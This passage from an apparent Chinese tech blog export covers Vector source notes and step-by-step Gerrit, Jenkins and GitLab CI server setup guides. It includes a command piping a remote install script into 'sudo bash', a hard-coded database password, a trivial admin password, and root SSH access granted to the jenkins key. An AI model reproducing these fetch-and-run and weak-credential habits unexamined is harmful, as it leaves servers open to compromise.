class_">NoSuchElementException</span>();</span><br><span class="line">                cursor = i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> elementData(lastRet = i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (lastRet == -<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>();</span><br><span class="line">            <span class="keyword">synchronized</span> (Vector.<span class="built_in">this</span>) &#123;</span><br><span class="line">                checkForComodification();</span><br><span class="line">                Vector.<span class="built_in">this</span>.remove(lastRet);</span><br><span class="line">                expectedModCount = modCount;</span><br><span class="line">            &#125;</span><br><span class="line">            cursor = lastRet;</span><br><span class="line">            lastRet = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> E&gt; action)</span> &#123;</span><br><span class="line">            Objects.requireNonNull(action);</span><br><span class="line">            <span class="keyword">synchronized</span> (Vector.<span class="built_in">this</span>) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> elementCount;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= size) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="keyword">final</span> E[] elementData = (E[]) Vector.<span class="built_in">this</span>.elementData;</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= elementData.length) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (i != size &amp;&amp; modCount == expectedModCount) &#123;</span><br><span class="line">                    action.accept(elementData[i++]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// update once at end of iteration to reduce heap write traffic</span></span><br><span class="line">                cursor = i;</span><br><span class="line">                lastRet = i - <span class="number">1</span>;</span><br><span class="line">                checkForComodification();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkForComodification</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><ul>
<li><p>元素：有序，可重复，可为null，可以通过迭代器遍历；通过Object数组实现。</p>
</li>
<li><p>大部分特点与ArrayList类似，不同之处：</p>
<p>1）ArrayList无参构造默认为空数组，add时扩容为10，Vector无参构造初始化数组已经为10；</p>
<p>2）ArrayList扩容大小为原来1.5倍（向下取整），Vector扩容大小为旧容量+扩容增量（扩容增量小于等于0，则为旧容量*2）；</p>
<p>3）ArrayList是线程不安全的，Vector是线程安全的，它的方法是同步的(synchronized)。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>源码分析</category>
        <category>集合</category>
        <category>Vector</category>
      </categories>
      <tags>
        <tag>源码分析</tag>
        <tag>Vector</tag>
      </tags>
  </entry>
  <entry>
    <title>Git+Gerrit+Jenkins持续集成</title>
    <url>/2020/01/16/Git+Gerrit+Jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/</url>
    <content><![CDATA[<p>简介：使用gerrit做code review，结合jenkins持续集成环境配置搭建，前提需要准备好git、jdk、mysql、nginx、maven环境</p>
<h1 id="1-gerrit安装（版本2-16-2）"><a href="#1-gerrit安装（版本2-16-2）" class="headerlink" title="1. gerrit安装（版本2.16.2）"></a>1. gerrit安装（版本2.16.2）</h1><h2 id="1-1-mysql配置"><a href="#1-1-mysql配置" class="headerlink" title="1.1 mysql配置"></a>1.1 mysql配置</h2><p>登录mysql，为gerrit创建mysql用户以及数据库</p>
<ul>
<li>mysql创建gerrit用户</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE USER &#x27;gerrit&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;Dell@2050&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>mysql创建reviewdb数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE reviewdb DEFAULT CHARACTER SET &#x27;utf8&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>把reviewdb所有权授予给gerrit用户</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT ALL ON reviewdb.* TO &#x27;gerrit&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>刷新配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-为gerrit创建linux用户"><a href="#1-2-为gerrit创建linux用户" class="headerlink" title="1.2 为gerrit创建linux用户"></a>1.2 为gerrit创建linux用户</h2><ul>
<li>创建gerrit用户</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo useradd gerrit</span><br></pre></td></tr></table></figure>

<ul>
<li>修改用户路径权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chmod 755 /home/gerrit</span><br></pre></td></tr></table></figure>

<ul>
<li>切换到用户</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su gerrit</span><br></pre></td></tr></table></figure>

<h2 id="1-3-初始化gerrit"><a href="#1-3-初始化gerrit" class="headerlink" title="1.3 初始化gerrit"></a>1.3 初始化gerrit</h2><ul>
<li>把下载好的gerrit上传到服务器，并在该目录上执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar gerrit-2.16.2.war init -d /home/gerrit/gerrit_review</span><br></pre></td></tr></table></figure>

<p><img src="/../img/202204211635767.png" alt="image-20220421163516716"></p>
<p><img src="/../img/202204211636884.png" alt="image-20220421163608825"></p>
<p><img src="/../img/202204211636856.png" alt="image-20220421163643797"></p>
<ul>
<li>修改配置文件 <code>/home/gerrit/gerrit_review/etc/gerrit.config</code></li>
</ul>
<p><img src="/../img/202204211631903.png" alt="image-20220421163156843"></p>
<ul>
<li>修改配置文件 <code>/home/gerrit/gerrit_review/etc/secure.config</code></li>
</ul>
<p><img src="/../img/202204211637168.png" alt="image-20220421163758129"></p>
<h2 id="1-4-安装delete-project插件"><a href="#1-4-安装delete-project插件" class="headerlink" title="1.4 安装delete-project插件"></a>1.4 安装delete-project插件</h2><ul>
<li><a href="https://gerrit-ci.gerritforge.com/">下载delete-project</a> 对应gerrit版本的插件：</li>
</ul>
<p><img src="/../img/202204211704463.png" alt="image-20220421170425405"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 切换到插件目录</span><br><span class="line">cd /home/gerrit/gerrit_review/plugins/</span><br><span class="line"></span><br><span class="line"># 使用wget下载</span><br><span class="line">wget https://gerrit-ci.gerritforge.com/job/plugin-delete-project-bazel-stable-2.16/lastSuccessfulBuild/artifact/bazel-genfiles/plugins/delete-project/delete-project.jar</span><br><span class="line"></span><br><span class="line"># 重启gerrit</span><br><span class="line">/home/gerrit/gerrit_review/bin/gerrit.sh restart</span><br></pre></td></tr></table></figure>

<h2 id="1-5-nginx反向代理配置"><a href="#1-5-nginx反向代理配置" class="headerlink" title="1.5 nginx反向代理配置"></a>1.5 nginx反向代理配置</h2><ul>
<li>备份默认配置，供给以后使用，这个配置不生效</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/default.config</span><br></pre></td></tr></table></figure>

<ul>
<li>作为gerrit的配置使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/gerrit.conf</span><br></pre></td></tr></table></figure>

<ul>
<li>修改 <code>/etc/nginx/conf.d/gerrit.conf</code></li>
</ul>
<p><img src="/../img/202204211711537.png" alt="image-20220421171159476"></p>
<h2 id="1-6-httpd安装并启动nginx"><a href="#1-6-httpd安装并启动nginx" class="headerlink" title="1.6 httpd安装并启动nginx"></a>1.6 httpd安装并启动nginx</h2><ul>
<li>使用yum安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y httpd</span><br></pre></td></tr></table></figure>

<ul>
<li>创建用户，会覆盖原来的文件，不能用于添加用户，只能用于创建第一个，这里创建用户名为admin的用户。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">htpasswd -c /home/gerrit/gerrit.password admin</span><br></pre></td></tr></table></figure>

<ul>
<li>添加用户，这里添加名为jenkins的用户，用于与jenkins进行数据交互。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">htpasswd -m /home/gerrit/gerrit.password jenkins</span><br></pre></td></tr></table></figure>

<ul>
<li>创建密码备份文件，每次修改管理员用户名后都要备份一次，注意是修改管理员用户名，不是密码，修改管理员用户名看附录一。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat gerrit.password &gt; gerrit.password.bak</span><br></pre></td></tr></table></figure>

<ul>
<li>httpd相关用法（这里的&#x2F;home&#x2F;gerrit&#x2F;gerrit.password为保存用户名&#x2F;密码的文件）：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建用户，会覆盖原来的文件，不能用于添加用户，只能用于创建第一个，这里创建用户名为admin的用户。</span><br><span class="line">htpasswd -c /home/gerrit/gerrit.password admin</span><br><span class="line"></span><br><span class="line"># 添加用户，这里添加名为jenkins的用户。</span><br><span class="line">htpasswd -m /home/gerrit/gerrit.password jenkins</span><br><span class="line"></span><br><span class="line"># 更新密码</span><br><span class="line">htpasswd /home/gerrit/gerrit.password jenkins</span><br><span class="line"></span><br><span class="line"># 删除用户xxx</span><br><span class="line">htpasswd –D /home/gerrit/gerrit.password xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>修改gerrit管理员用户名（不能直接修改，只能用新的账号授权为管理员，再把旧的删掉）：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.	添加一个新的用户（当作新管理员的用户）</span><br><span class="line">2.	使用原管理员账户登陆gerrit</span><br><span class="line">3.	Groups-&gt;Administractors-&gt;Members-&gt;把新创建的用户添加到管理员组中</span><br><span class="line">4.	使用新添加的用户登陆gerrit-&gt;删掉旧的管理员用户</span><br><span class="line">5.	删掉/home/gerrit/gerrit.password中旧的管理员的用户</span><br></pre></td></tr></table></figure>

<h1 id="2-jenkins安装（版本2-150-2）"><a href="#2-jenkins安装（版本2-150-2）" class="headerlink" title="2. jenkins安装（版本2.150.2）"></a>2. jenkins安装（版本2.150.2）</h1><ul>
<li>下载jenkins的镜像源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo</span><br></pre></td></tr></table></figure>

<ul>
<li>rpm导入镜像源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key</span><br></pre></td></tr></table></figure>

<ul>
<li>如果镜像源连接不同，则到官网下载对应版本的rpm包，使用rpm –ivh jenkins的rpm包进行安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y jenkins</span><br></pre></td></tr></table></figure>

<ul>
<li><p>修改端口（<code>/etc/sysconfig/jenkins</code>配置中），默认为8080，改为8250</p>
</li>
<li><p>启动方式</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 前台运行（不建议使用）</span><br><span class="line">java -jar /usr/lib/jenkins/jenkins.war --httpPort=8250</span><br><span class="line"></span><br><span class="line"># 后台运行（不建议使用）</span><br><span class="line">nohup java -jar /usr/lib/jenkins/jenkins.war --httpPort=8250 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"># 后台运行日志（不建议使用）</span><br><span class="line">/etc/rc.d/init.d/nohup.out</span><br><span class="line"></span><br><span class="line"># 以系统服务运行（建议使用），先在/etc/init.d/jenkins指定java位置/usr/local/jdk1.8.0_201/bin/java，运行：</span><br><span class="line">systemctl start jenkins.service</span><br></pre></td></tr></table></figure>

<p><img src="/../img/202204211729145.png" alt="image-20220421172951071"></p>
<ul>
<li>配置自启动</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --add /etc/init.d/jenkins</span><br><span class="line"></span><br><span class="line">chkconfig jenkins on</span><br></pre></td></tr></table></figure>

<ul>
<li>访问</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:port/</span><br><span class="line"></span><br><span class="line"># 获取初始化密码，手动设置管理员账号：admin，密码：123（后续可以改）</span><br><span class="line">cat /var/lib/jenkins/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure>

<h1 id="3-jenkins-gerrit-git配置"><a href="#3-jenkins-gerrit-git配置" class="headerlink" title="3. jenkins+gerrit+git配置"></a>3. jenkins+gerrit+git配置</h1><h2 id="3-1-安装jenkins插件"><a href="#3-1-安装jenkins插件" class="headerlink" title="3.1 安装jenkins插件"></a>3.1 安装jenkins插件</h2><ul>
<li>系统管理-&gt;插件管理-&gt;Available-&gt;Gerrit Trigger、Maven Integration plugin、Publish Over SSH、SSH</li>
</ul>
<h2 id="3-2-全局工具配置"><a href="#3-2-全局工具配置" class="headerlink" title="3.2 全局工具配置"></a>3.2 全局工具配置</h2><ul>
<li>系统管理-&gt;全局工具配置</li>
</ul>
<p><img src="/../img/202204211738537.png" alt="image-20220421173809484"></p>
<hr>
<p><img src="/../img/202204211739857.png" alt="image-20220421173937811"></p>
<h2 id="3-3-为jenkins生成ssh-key"><a href="#3-3-为jenkins生成ssh-key" class="headerlink" title="3.3 为jenkins生成ssh-key"></a>3.3 为jenkins生成ssh-key</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在jenkins服务器上生成ssh-key，并把id_rsa.pub内容粘贴到gerrit的jenkins用户中。</span><br><span class="line"></span><br><span class="line">cd /var/lib/jenkins/</span><br><span class="line">mkdir .ssh &amp;&amp; cd .ssh/ &amp;&amp; touch id_rsa</span><br><span class="line"># 把密钥保存到/var/lib/Jenkins/.ssh/id_rsa中，提示覆盖</span><br><span class="line">ssh-keygen –t rsa</span><br></pre></td></tr></table></figure>

<p><img src="/../img/202204211743815.png" alt="image-20220421174352757"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown jenkins:jenkins id_rsa*</span><br><span class="line">cd ..</span><br><span class="line">chown jenkins:jenkins .ssh/</span><br></pre></td></tr></table></figure>

<p>把id_rsa.pub(<code>/var/lib/jenkins/.ssh/id_rsa.pub</code>)内容粘贴到gerrit的jenkins用户中：</p>
<p><img src="/../img/202204211835326.png" alt="image-20220421183524261"></p>
<h2 id="3-4-Gerrit权限配置"><a href="#3-4-Gerrit权限配置" class="headerlink" title="3.4 Gerrit权限配置"></a>3.4 Gerrit权限配置</h2><ul>
<li>BROWSE-&gt;Groups-&gt;Non-Interactive Users-&gt;Members-&gt;添加jenkins用户</li>
</ul>
<p><img src="/../img/202204211748977.png" alt="image-20220421174854932"></p>
<ul>
<li>配置具体项目的权限，这里以hello-world为例子：BROWSE-&gt;Repositories-&gt;CREATE NEW-&gt;创建hello-world项目</li>
</ul>
<p><img src="/../img/202204211750643.png" alt="image-20220421175003590"></p>
<p><img src="/../img/202204211750089.png" alt="image-20220421175030018"></p>
<ul>
<li><p>在2.7+版本需要配置，这里用的是2.16.2.因此也要配置：</p>
<p>BROWSE-&gt;Groups-&gt;CREATE NEW-&gt;创建Event Streaming Users，把jenkins用户添加进去</p>
</li>
</ul>
<p><img src="/../img/202204211751354.png" alt="image-20220421175123310"></p>
<p>​	BROWSE-&gt;Repositories-&gt;All-Projects-&gt;Access-&gt;Edit-&gt;在Global Capabilities的Stream Events添加Event Streaming Users</p>
<p><img src="/../img/202204211752640.png" alt="image-20220421175255592"></p>
<h2 id="3-5-配置Jenkins"><a href="#3-5-配置Jenkins" class="headerlink" title="3.5 配置Jenkins"></a>3.5 配置Jenkins</h2><h3 id="3-5-1-配置Gerrit-Trigger"><a href="#3-5-1-配置Gerrit-Trigger" class="headerlink" title="3.5.1 配置Gerrit Trigger"></a>3.5.1 配置Gerrit Trigger</h3><ul>
<li>系统管理-&gt;Gerrit Trigger-&gt;Add New Server-&gt;给gerrit服务器起名，勾选Gerrit Server with Default Configurations-&gt;点击ok-&gt;再进行gerrit服务器具体配置-&gt;点击底部的Save</li>
</ul>
<p><img src="/../img/202204211755862.png" alt="image-20220421175508821"></p>
<p><img src="/../img/202204211756139.png" alt="image-20220421175617085"></p>
<h3 id="3-5-2-新建以及配置具体的项目"><a href="#3-5-2-新建以及配置具体的项目" class="headerlink" title="3.5.2 新建以及配置具体的项目"></a>3.5.2 新建以及配置具体的项目</h3><ul>
<li>这里以hello-world为例：NEW任务-&gt;输入项目名称hello-world，选择maven项目-&gt;OK-&gt;进行详细配置</li>
</ul>
<p><img src="/../img/202204211758377.png" alt="image-20220421175815323"></p>
<p><img src="/../img/202204211758089.png" alt="image-20220421175842038"></p>
<p><img src="/../img/202204211803559.png" alt="image-20220421180304513"></p>
<p><img src="/../img/202204211804242.png" alt="image-20220421180435194"></p>
<p><img src="/../img/202204211805089.png" alt="image-20220421180542042"></p>
<p><img src="/../img/202204211806059.png" alt="image-20220421180633014"></p>
<p><img src="/../img/202204211807629.png" alt="image-20220421180707572"></p>
<p><img src="/../img/202204211807963.png" alt="image-20220421180736918"></p>
<p>​	点击底部保存退出</p>
<h3 id="3-5-3-配置远程登录"><a href="#3-5-3-配置远程登录" class="headerlink" title="3.5.3 配置远程登录"></a>3.5.3 配置远程登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 首先要确保authorized_keys是否存在，否则需要自己创建</span><br><span class="line">cat /var/lib/jenkins/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h3 id="3-5-4-配置Publish-over-SSH"><a href="#3-5-4-配置Publish-over-SSH" class="headerlink" title="3.5.4 配置Publish over SSH"></a>3.5.4 配置Publish over SSH</h3><p>系统管理 -&gt; 系统设置 -&gt; Publish over SSH</p>
<p><img src="/../img/202204211810129.png" alt="image-20220421181030082"></p>
<h3 id="3-5-5-完善配置项目配置中的Post-Steps"><a href="#3-5-5-完善配置项目配置中的Post-Steps" class="headerlink" title="3.5.5 完善配置项目配置中的Post Steps"></a>3.5.5 完善配置项目配置中的Post Steps</h3><p><img src="/../img/202204211811344.png" alt="image-20220421181133280"></p>
<h3 id="3-5-6-创建publish-sh脚本"><a href="#3-5-6-创建publish-sh脚本" class="headerlink" title="3.5.6 创建publish.sh脚本"></a>3.5.6 创建publish.sh脚本</h3><ul>
<li>创建<code>/projects/springboot/hello-world</code>目录，并在该目录下创建publish.sh</li>
</ul>
<p><img src="/../img/202204211813546.png" alt="image-20220421181305490"></p>
<h2 id="3-6-创建gerrit的个人账号"><a href="#3-6-创建gerrit的个人账号" class="headerlink" title="3.6 创建gerrit的个人账号"></a>3.6 创建gerrit的个人账号</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">htpasswd -m /home/gerrit/gerrit.password xxx</span><br></pre></td></tr></table></figure>

<h2 id="3-7-初始化个人账号"><a href="#3-7-初始化个人账号" class="headerlink" title="3.7 初始化个人账号"></a>3.7 初始化个人账号</h2><ul>
<li>个人电脑安装git，用以下命令使用git bash创建密钥</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen –t rsa –C &quot;邮箱&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用上面创建的个人账号登陆gerrit，把刚刚生成的公钥粘贴到ssh处，并初始化邮箱，到邮箱中点击认证的链接</li>
</ul>
<p><img src="/../img/202204211837240.png" alt="image-20220421183755181"></p>
<h2 id="3-8-初始化gerrit项目"><a href="#3-8-初始化gerrit项目" class="headerlink" title="3.8 初始化gerrit项目"></a>3.8 初始化gerrit项目</h2><ul>
<li>复制仓库地址，使用git bash克隆项目，编写初始化的代码后，在git push前执行：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config remote.origin.push refs/heads/*:refs/for/*</span><br></pre></td></tr></table></figure>

<p><img src="/../img/202204211820332.png" alt="image-20220421182028275"></p>
<p>​	执行git push完成项目初始化</p>
<h1 id="4-注意事项"><a href="#4-注意事项" class="headerlink" title="4. 注意事项"></a>4. 注意事项</h1><h2 id="4-1-切换jenkins用户的问题"><a href="#4-1-切换jenkins用户的问题" class="headerlink" title="4.1 切换jenkins用户的问题"></a>4.1 切换jenkins用户的问题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd jenkins</span><br><span class="line">su jenkins</span><br><span class="line">sudo vim /etc/passwd		//把jenkins用户的/bin/false改为/bin/bash</span><br><span class="line">/*一下在jenkins用户操作*/</span><br><span class="line">vim ~/.bash_profile </span><br><span class="line">export PS1=&#x27;[\u@\h \W]\$&#x27;	//添加后保存退出</span><br><span class="line">source ~/.bash_profile		//重新加载配置文件</span><br></pre></td></tr></table></figure>

<h2 id="4-2-使用非对称秘钥登录linux"><a href="#4-2-使用非对称秘钥登录linux" class="headerlink" title="4.2 使用非对称秘钥登录linux"></a>4.2 使用非对称秘钥登录linux</h2><p>在个人主机生成秘钥对，把公钥交给linux管理员，放在该用户的<code>~/.ssh/authorized_keys</code>中，再通过私钥进行登录即可。原因<code>/etc/ssh/sshd_config</code>中配置了校验文件</p>
<h2 id="4-3-不能直接提交到master分支"><a href="#4-3-不能直接提交到master分支" class="headerlink" title="4.3 不能直接提交到master分支"></a>4.3 不能直接提交到master分支</h2><p>需要在git push前运行如下命令，提交到<code>refs/for/master</code>分支</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config remote.origin.push refs/heads/*:refs/for/*</span><br></pre></td></tr></table></figure>

<h2 id="4-4-端口使用情况"><a href="#4-4-端口使用情况" class="headerlink" title="4.4 端口使用情况"></a>4.4 端口使用情况</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">465/tcp		//发邮件端口</span><br><span class="line">80/tcp		//项目端口</span><br><span class="line">8173/tcp		//gerrit端口</span><br><span class="line">8170/tcp		//gerrit代理端口</span><br><span class="line">29418/tcp	//使用使用ssh进行git clone端口</span><br><span class="line">8250/tcp		//jenkins端口</span><br><span class="line">3306/tcp		//mysql数据库端口</span><br></pre></td></tr></table></figure>

<h2 id="4-5-代码审核不通过的处理"><a href="#4-5-代码审核不通过的处理" class="headerlink" title="4.5 代码审核不通过的处理"></a>4.5 代码审核不通过的处理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上一次代码提交到gerrit后，经过jenkins审核不通过，本地处理错误后，运行以下命令：</span><br><span class="line">git add xxx				//添加到本地暂存区</span><br><span class="line">git commit --amend		//运行后保存退出</span><br><span class="line">git push origin HEAD:refs/for/master	//push到远程仓库</span><br></pre></td></tr></table></figure>

<h2 id="4-6-Gerrit邮箱问题"><a href="#4-6-Gerrit邮箱问题" class="headerlink" title="4.6 Gerrit邮箱问题"></a>4.6 Gerrit邮箱问题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用命令绑定邮箱，通过ssh连接gerrit的服务器：</span><br><span class="line">1.在管理员电脑上生成ssh-key对，并登录gerrit，把公钥粘贴到ssh-key处</span><br><span class="line">2.登录gerrit服务器，切换至gerrit用户，再把公钥粘贴到~/.ssh/authorized_keys中，并把.ssh权限改为755，authorized_keys权限为644</span><br><span class="line">3.在管理员电脑上生成~/.ssh/config，里面的内容为：</span><br><span class="line">Host gerrit				#待会使用ssh连接的主机名</span><br><span class="line">HostName 192.168.147.130		#ip地址</span><br><span class="line">User admin				#以什么用户连接，这里的是gerrit的管理员用户</span><br><span class="line">Port 29418				#端口号，gerrit使用ssh连接时默认29418</span><br><span class="line">IdentityFile ~/.ssh/id_rsa		#刚才生成的私钥</span><br><span class="line">4.具体命令</span><br><span class="line">ssh gerrit gerrit --help		//查看用法</span><br><span class="line">ssh gerrit gerrit set-account --add-email HeZhifei@163.com HeZhifei	//第一个gerrit为上一步的主机名，第二个gerrit为命令，这里为HeZhifei用户添加email</span><br></pre></td></tr></table></figure>

<h1 id="5-使用教程"><a href="#5-使用教程" class="headerlink" title="5. 使用教程"></a>5. 使用教程</h1><ul>
<li><p>访问地址 <code>http://IP:8170</code></p>
</li>
<li><p><a href="https://git-scm.com/download/win">安装git</a></p>
</li>
<li><p>通过<code>ssh-keygen -t rsa -C &quot;邮箱&quot;</code>生成公私钥，并把公钥复制到</p>
</li>
</ul>
<p><img src="/../img/202204211853365.png" alt="image-20220421185336306"></p>
<ul>
<li>克隆代码到本地，BROWSE-&gt;点击对应的项目-&gt;点击Clone with commit-msg hook下面克隆的链接，别选其他链接进行克隆</li>
</ul>
<p><img src="/../img/202204211857868.png" alt="image-20220421185715817"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：</span><br><span class="line">	gerrit不允许直接提交到refs/heads/*分支，需要提交到refs/for/*分支进行代码审核后在管理员合并到refs/heads/*对应的分支，例如：要推送到远程的feature-1.0.0分支，需要git push origin HEAD:refs/for/feature-1.0.0，而不能直接git push origin HEAD:refs/heads/feature-1.0.0</span><br><span class="line">项目规划：先初步分两个分支master和develop，master分支不可以直接提交代码，在开发中先把代码上传到develop分支，待开发第一阶段完成后，一并合并到master分支。理论上在git的代码托管平台里面，可以通过git push origin develop来进行提交代码到develop分支，但是在gerrit的代码审核里面，不允许往refs/heads/*上面提交代码，需要提交到refs/for/*对应的分支上，代码审核通过后，方可由管理员进行合并到对应的分支，例如：想要往develop提交代码，需要使用git push origin HEAD:refs/for/develop，代码审核通过后再合并到refs/heads/*对应的分支，这里对应的分支是refs/heads/develop，也就是通常的develop分支。</span><br></pre></td></tr></table></figure>

<ul>
<li><p>修改个人账户密码</p>
<p>登录服务器，输入<code>htpasswd /home/gerrit/gerrit.password xxx</code>，这里的xxx是个人gerrit账号名，也就是自己的姓名，再输入两次密码即可成功修改</p>
</li>
</ul>
]]></content>
      <categories>
        <category>持续集成</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Gerrit</tag>
        <tag>Jenkins</tag>
        <tag>持续集成</tag>
      </tags>
  </entry>
  <entry>
    <title>GitLab+Jenkins自动化部署Vue项目</title>
    <url>/2022/07/10/GitLab+Jenkins%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h1 id="1-环境搭建（centos7）"><a href="#1-环境搭建（centos7）" class="headerlink" title="1. 环境搭建（centos7）"></a>1. 环境搭建（centos7）</h1><h2 id="1-1-gitlab安装"><a href="#1-1-gitlab安装" class="headerlink" title="1.1 gitlab安装"></a>1.1 gitlab安装</h2><h3 id="1-1-1-gitlab-ee安装"><a href="#1-1-1-gitlab-ee安装" class="headerlink" title="1.1.1 gitlab-ee安装"></a>1.1.1 gitlab-ee安装</h3><p>环境安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install -y curl policycoreutils-python openssh-server perl</span><br><span class="line">sudo systemctl enable sshd</span><br><span class="line">sudo systemctl start sshd</span><br><span class="line"></span><br><span class="line">sudo firewall-cmd --permanent --add-service=http</span><br><span class="line">sudo firewall-cmd --permanent --add-service=https</span><br><span class="line">sudo systemctl reload firewalld</span><br></pre></td></tr></table></figure>
<p>安装Postfix以发送通知电子邮件，可以使用其它smtp的途径而跳过此步骤（非必须）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install postfix</span><br><span class="line">sudo systemctl enable postfix</span><br><span class="line">sudo systemctl start postfix</span><br></pre></td></tr></table></figure>
<p>安装镜像仓库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ee/script.rpm.sh | sudo bash</span><br></pre></td></tr></table></figure>
<p>gitlab-ee安装：<br>EXTERNAL_URL为gitlab的访问地址，需要在客户端机器上配置hosts：</p>
<blockquote>
<p>gitlab服务器的ip地址 zhifei.gitlab.com</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo EXTERNAL_URL=&quot;http://zhifei.gitlab.com:8888&quot; yum install -y gitlab-ee</span><br></pre></td></tr></table></figure>
<p>或者EXTERNAL_URL直接配置成ip+端口号，而不使用主机名的方式</p>
